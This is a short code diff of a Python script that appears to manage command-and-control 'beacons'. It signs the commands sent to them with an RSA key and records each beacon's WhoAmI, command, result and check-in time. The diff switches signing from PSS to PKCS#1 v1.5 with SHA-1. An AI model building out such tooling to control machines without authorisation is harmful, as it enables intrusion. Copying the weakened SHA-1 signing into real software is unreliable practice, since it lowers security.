@@ -7,7 +7,6 @@ import cryptography.exceptions
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.asymmetric import padding
 from cryptography.hazmat.primitives import hashes
-import binascii
 
 # Needs a function to wipe the db and make all active beacons check in again
 
@@ -58,8 +57,7 @@ while True:
 
         with open('keys/' + "test_priv" + ".pem", "rb") as key_file:  # Read in the pem file for the UUID
             private_key = serialization.load_pem_private_key(key_file.read(), password=None)
-        signature = private_key.sign(signed_inp, padding.PSS(mgf=padding.MGF1(hashes.SHA1()),
-                                                          salt_length=padding.PSS.MAX_LENGTH), hashes.SHA1())
+        signature = private_key.sign(signed_inp, padding.PKCS1v15(), hashes.SHA1())
         #signature_decoded = binascii.b2a_hex(signature).decode()
 
         #signature_bytes = bytes(signature_decoded, 'utf-8')
@@ -69,11 +67,8 @@ while True:
             public_key.verify(
                 signature,
                 signed_inp,
-                padding.PSS(
-                    mgf=padding.MGF1(hashes.SHA1()),
-                    salt_length=padding.PSS.MAX_LENGTH,
-                ),
-                hashes.SHA1(),
+                padding.PKCS1v15(),
+                hashes.SHA1()
             )
         except cryptography.exceptions.InvalidSignature as e:
             print('ERROR: Payload and/or signature files failed verification!')
@@ -83,7 +78,7 @@ while True:
             "WhoAmI": f"{whoami}",
             "Signature": f"{signature}",
             "Retrieved": "1",  # Set retrieved to 1 so we know we got results
-            "Command": f"{signed_inp}",
+            "Command": f"{cm}",
             "LastInteraction": f"{LastInteraction}",
             "LastCheckIn": f"{datetime.today().strftime('%Y-%m-%d %H:%M:%S')}",
             "Result": f"{result}",
